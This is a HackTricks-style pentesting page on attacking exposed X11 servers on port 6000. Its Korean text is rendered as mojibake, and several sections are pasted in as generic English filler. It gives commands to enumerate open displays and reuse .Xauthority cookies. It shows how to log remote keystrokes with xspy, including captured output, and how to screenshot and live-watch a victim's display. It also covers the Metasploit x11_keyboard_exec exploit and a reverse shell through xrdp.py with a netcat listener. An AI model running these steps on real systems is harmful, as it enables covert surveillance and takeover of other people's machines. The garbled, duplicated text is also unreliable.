# 6000 - X11 íœí…ŒìŠ¤íŒ…

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking Tricksë¥¼ ê³µìœ í•˜ë ¤ë©´ PRì„** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ì €ì¥ì†Œì— ì œì¶œ**í•˜ì„¸ìš”.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

ê²½í—˜ìˆëŠ” í•´ì»¤ì™€ ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ì™€ ì†Œí†µí•˜ê¸° ìœ„í•´ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ì°¸ì—¬í•˜ì„¸ìš”!

**í•´í‚¹ ì¸ì‚¬ì´íŠ¸**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì„ ë‹¤ë£¨ëŠ” ì½˜í…ì¸ ì™€ ìƒí˜¸ ì‘ìš©í•˜ì„¸ìš”.

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ë ¥ì„ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ë¥¼ ë”°ë¼ê°€ì„¸ìš”.

**ìµœì‹  ê³µì§€ì‚¬í•­**\
ìƒˆë¡œìš´ ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•œ ì •ë³´ë¥¼ ë°›ì•„ë³´ì„¸ìš”.

**[Discord](https://discord.com/invite/N3FrSbmwdy)ì— ì°¸ì—¬í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!**

## ê¸°ë³¸ ì •ë³´

**X Window System** (X)ì€ UNIX ê¸°ë°˜ ìš´ì˜ ì²´ì œì—ì„œ ë„ë¦¬ ì‚¬ìš©ë˜ëŠ” ë‹¤ëª©ì  ì°½ ì‹œìŠ¤í…œì…ë‹ˆë‹¤. ì´ëŠ” ê°œë³„ í”„ë¡œê·¸ë¨ì´ ì‚¬ìš©ì ì¸í„°í˜ì´ìŠ¤ ë””ìì¸ì„ ì²˜ë¦¬í•˜ëŠ” ê·¸ë˜í”½ **ì‚¬ìš©ì ì¸í„°í˜ì´ìŠ¤ (GUI)**ë¥¼ ìƒì„±í•˜ê¸° ìœ„í•œ í”„ë ˆì„ì›Œí¬ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ìœ ì—°ì„±ì€ X í™˜ê²½ ë‚´ì—ì„œ ë‹¤ì–‘í•˜ê³  ì‚¬ìš©ì ì •ì˜ ê°€ëŠ¥í•œ ê²½í—˜ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤.

**ê¸°ë³¸ í¬íŠ¸:** 6000
```
PORT       STATE   SERVICE
6000/tcp   open    X11
```
## ì—´ê±°

**ìµëª… ì—°ê²°**ì„ í™•ì¸í•˜ì„¸ìš”.
```bash
nmap -sV --script x11-access -p <PORT> <IP>
msf> use auxiliary/scanner/x11/open_x11
```
#### ë¡œì»¬ ì—´ê±°

ì‚¬ìš©ìì˜ í™ˆ í´ë”ì—ìˆëŠ” íŒŒì¼ **`.Xauthority`**ì€ **X11ì˜ ì¸ì¦ì— ì‚¬ìš©**ë©ë‹ˆë‹¤. [**ì—¬ê¸°**](https://stackoverflow.com/a/37367518)ì—ì„œ:
```bash
$ xxd ~/.Xauthority
00000000: 0100 0006 6d61 6e65 7063 0001 3000 124d  ............0..M
00000010: 4954 2d4d 4147 4943 2d43 4f4f 4b49 452d  IT-MAGIC-COOKIE-
00000020: 3100 108f 52b9 7ea8 f041 c49b 85d8 8f58  1...R.~..A.....X
00000030: 041d ef                                  ...
```
> MIT-magic-cookie-1: 128ë¹„íŠ¸ì˜ í‚¤("ì¿ í‚¤")ë¥¼ ìƒì„±í•˜ì—¬ \~/.Xauthority(ë˜ëŠ” XAUTHORITY í™˜ê²½ ë³€ìˆ˜ê°€ ê°€ë¦¬í‚¤ëŠ” ìœ„ì¹˜)ì— ì €ì¥í•©ë‹ˆë‹¤. í´ë¼ì´ì–¸íŠ¸ëŠ” ì´ë¥¼ í‰ë¬¸ìœ¼ë¡œ ì„œë²„ì— ë³´ëƒ…ë‹ˆë‹¤! ì„œë²„ëŠ” ì´ "ì¿ í‚¤"ì˜ ì‚¬ë³¸ì„ ê°€ì§€ê³  ìˆëŠ”ì§€ í™•ì¸í•˜ê³ , ê·¸ë ‡ë‹¤ë©´ ì—°ê²°ì´ í—ˆìš©ë©ë‹ˆë‹¤. ì´ í‚¤ëŠ” DMXì— ì˜í•´ ìƒì„±ë©ë‹ˆë‹¤.

{% hint style="warning" %}
ì¿ í‚¤ë¥¼ **ì‚¬ìš©**í•˜ë ¤ë©´ í™˜ê²½ ë³€ìˆ˜ë¥¼ ì„¤ì •í•´ì•¼ í•©ë‹ˆë‹¤: **`export XAUTHORITY=/path/to/.Xauthority`**
{% endhint %}

#### ë¡œì»¬ ì—´ê±° ì„¸ì…˜
```bash
$ w
23:50:48 up 1 day, 10:32,  1 user,  load average: 0.29, 6.48, 7.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
user     tty7     :0               13Oct23 76days 13:37   2.20s xfce4-session
```
## ì—°ê²° í™•ì¸

To verify the X11 connection, you can use the `xeyes` command. This command will open a small window with a pair of eyes that follow the mouse cursor. If the X11 connection is successful, you should see the eyes following your mouse movements.

X11 ì—°ê²°ì„ í™•ì¸í•˜ê¸° ìœ„í•´ `xeyes` ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ë§ˆìš°ìŠ¤ ì»¤ì„œë¥¼ ë”°ë¼ê°€ëŠ” ëˆˆ ìŒì´ ìˆëŠ” ì‘ì€ ì°½ì„ ì—½ë‹ˆë‹¤. X11 ì—°ê²°ì´ ì„±ê³µì ì´ë¼ë©´ ëˆˆì´ ë§ˆìš°ìŠ¤ ì›€ì§ì„ì„ ë”°ë¼ê°€ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤.
```bash
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
```
## í‚¤ë¡œê¹…

[xspy](http://tools.kali.org/sniffingspoofing/xspy)ë¥¼ ì‚¬ìš©í•˜ì—¬ í‚¤ë³´ë“œì˜ í‚¤ ì…ë ¥ì„ ê°€ë¡œì±„ì„¸ìš”.

ìƒ˜í”Œ ì¶œë ¥:
```
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
```
## ìŠ¤í¬ë¦°ìƒ· ìº¡ì²˜

To gather evidence during a penetration test, capturing screenshots can be a useful technique. Screenshots can provide visual proof of successful exploits, sensitive information, or unauthorized access.

### Using X11

X11 is a widely used windowing system that allows graphical applications to run on Unix-like operating systems. It provides a protocol for communication between the client (application) and the server (display).

To capture screenshots using X11, you can use the `xwd` command. This command allows you to capture the contents of the X11 display and save it as an XWD (X Window Dump) file.

Here's an example of how to capture a screenshot using `xwd`:

```bash
$ xwd -root -out screenshot.xwd
```

This command captures the entire root window and saves it as `screenshot.xwd` in the current directory.

To view the captured screenshot, you can use the `xwud` command:

```bash
$ xwud -in screenshot.xwd
```

This command opens a window displaying the captured screenshot.

### Using Xvfb

Xvfb (X virtual framebuffer) is a display server implementation that performs all graphical operations in memory without showing any screen output. It can be used to capture screenshots without displaying them on a physical screen.

To capture screenshots using Xvfb, you can follow these steps:

1. Start Xvfb:

   ```bash
   $ Xvfb :1 -screen 0 1024x768x24
   ```

   This command starts Xvfb on display `:1` with a screen resolution of `1024x768` and a color depth of `24` bits.

2. Set the `DISPLAY` environment variable to point to the Xvfb display:

   ```bash
   $ export DISPLAY=:1
   ```

3. Capture a screenshot using `xwd`:

   ```bash
   $ xwd -root -out screenshot.xwd
   ```

   This command captures the entire root window and saves it as `screenshot.xwd` in the current directory.

4. View the captured screenshot using `xwud`:

   ```bash
   $ xwud -in screenshot.xwd
   ```

   This command opens a window displaying the captured screenshot.

Capturing screenshots can be a valuable technique for documenting and presenting findings during a penetration test. It allows you to provide visual evidence of your actions and discoveries, making it easier to communicate the impact of vulnerabilities to stakeholders.
```bash
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
```
## ì›ê²© ë°ìŠ¤í¬í†± ë³´ê¸°

ì¶œì²˜: [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
```
./xrdp.py <IP:0>
```
ë°©ë²•: [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)

ë¨¼ì € xwininfoë¥¼ ì‚¬ìš©í•˜ì—¬ ì°½ì˜ IDë¥¼ ì°¾ì•„ì•¼í•©ë‹ˆë‹¤.
```
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

Absolute upper-left X:  0
Absolute upper-left Y:  0
Relative upper-left X:  0
Relative upper-left Y:  0
Width: 1024
Height: 768
Depth: 16
Visual: 0x21
Visual Class: TrueColor
Border width: 0
Class: InputOutput
Colormap: 0x20 (installed)
Bit Gravity State: ForgetGravity
Window Gravity State: NorthWestGravity
Backing Store State: NotUseful
Save Under State: no
Map State: IsViewable
Override Redirect State: no
Corners:  +0+0  -0+0  -0-0  +0-0
-geometry 1024x768+0+0
```
**XWatchwin**

ì‹¤ì‹œê°„ìœ¼ë¡œ ë³´ê¸° ìœ„í•´ì„œëŠ” ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤.
```bash
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```
## ì‰˜ íšë“

To gain shell access on a target system, you can exploit vulnerabilities in the X11 server. Here are a few techniques you can use:

### 1. X11 Forwarding

If the target system has X11 forwarding enabled, you can use it to run X11 applications remotely and potentially gain shell access. To do this, you need to have a local X server running and set the `DISPLAY` environment variable to point to your local X server.

### 2. X11 Reverse Shell

You can also use a reverse shell payload to exploit the X11 server. This involves creating a malicious X11 client that connects back to your machine and spawns a shell. Once the connection is established, you will have shell access on the target system.

### 3. X11 Injection

X11 injection involves injecting malicious code into a legitimate X11 client application. This can be done by modifying the client's code or by intercepting and modifying the X11 protocol messages. By injecting code, you can execute arbitrary commands on the target system and gain shell access.

### 4. X11 Server Vulnerabilities

Lastly, you can search for vulnerabilities in the X11 server software itself. Common vulnerabilities include buffer overflows, format string vulnerabilities, and privilege escalation vulnerabilities. Exploiting these vulnerabilities can allow you to gain shell access on the target system.

Remember to always obtain proper authorization before attempting any of these techniques. Unauthorized access to systems is illegal and unethical.
```
msf> use exploit/unix/x11/x11_keyboard_exec
```
ë‹¤ë¥¸ ë°©ë²•:

**ë¦¬ë²„ìŠ¤ ì‰˜:** XrdpëŠ” Netcatì„ í†µí•´ ë¦¬ë²„ìŠ¤ ì‰˜ì„ ì‚¬ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ëª…ë ¹ì„ ì…ë ¥í•˜ì„¸ìš”:
```bash
./xrdp.py \<IP:0> â€“no-disp
```
ì¸í„°í˜ì´ìŠ¤ì—ì„œ **R-ì‰˜ ì˜µì…˜**ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ëŸ° ë‹¤ìŒ ë¡œì»¬ ì‹œìŠ¤í…œì—ì„œ í¬íŠ¸ 5555ì—ì„œ **Netcat ë¦¬ìŠ¤ë„ˆ**ë¥¼ ì‹œì‘í•˜ì„¸ìš”.
```bash
nc -lvp 5555
```
ê·¸ëŸ¼, **R-Shell** ì˜µì…˜ì— IP ì£¼ì†Œì™€ í¬íŠ¸ë¥¼ ì…ë ¥í•˜ê³  **R-Shell**ì„ í´ë¦­í•˜ì—¬ ì‰˜ì„ ì–»ìœ¼ì„¸ìš”.


## ì°¸ê³  ìë£Œ
* [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)

## Shodan

* `port:6000 x11`

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

ê²½í—˜ ë§ì€ í•´ì»¤ì™€ ë²„ê·¸ ë°”ìš´í‹° í—Œí„°ì™€ ì†Œí†µí•˜ê¸° ìœ„í•´ [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) ì„œë²„ì— ê°€ì…í•˜ì„¸ìš”!

**í•´í‚¹ í†µì°°ë ¥**\
í•´í‚¹ì˜ ìŠ¤ë¦´ê³¼ ë„ì „ì„ ë‹¤ë£¨ëŠ” ì½˜í…ì¸ ì— ì°¸ì—¬í•˜ì„¸ìš”.

**ì‹¤ì‹œê°„ í•´í‚¹ ë‰´ìŠ¤**\
ì‹¤ì‹œê°„ ë‰´ìŠ¤ì™€ í†µì°°ë ¥ì„ í†µí•´ ë¹ ë¥´ê²Œ ë³€í™”í•˜ëŠ” í•´í‚¹ ì„¸ê³„ë¥¼ ë”°ë¼ê°€ì„¸ìš”.

**ìµœì‹  ê³µì§€ì‚¬í•­**\
ìƒˆë¡œìš´ ë²„ê·¸ ë°”ìš´í‹° ì¶œì‹œ ë° ì¤‘ìš”í•œ í”Œë«í¼ ì—…ë°ì´íŠ¸ì— ëŒ€í•œ ì •ë³´ë¥¼ ë°›ì•„ë³´ì„¸ìš”.

**[Discord](https://discord.com/invite/N3FrSbmwdy)**ì— ê°€ì…í•˜ì—¬ ìµœê³ ì˜ í•´ì»¤ë“¤ê³¼ í˜‘ì—…ì„ ì‹œì‘í•˜ì„¸ìš”!

<details>

<summary><strong>**htARTE (HackTricks AWS Red Team Expert)**ë¡œë¶€í„° AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family)ì¸ [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ë¥¼** íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
